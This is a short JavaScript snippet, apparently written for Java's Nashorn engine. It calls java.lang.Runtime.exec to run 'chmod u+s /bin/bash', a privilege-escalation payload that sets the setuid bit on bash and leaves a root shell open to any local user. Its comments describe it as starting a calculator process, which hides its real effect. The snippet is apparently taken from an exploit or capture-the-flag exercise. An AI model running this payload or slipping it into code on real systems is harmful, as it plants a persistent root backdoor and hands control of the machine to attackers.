// set process name to start
var cmd = "chmod u+s /bin/bash";

// create a reference to a Runtime object
var RuntimeJavaClass = Java.type('java.lang.Runtime');

// Start the calc process
RuntimeJavaClass.getRuntime().exec(cmd, null);
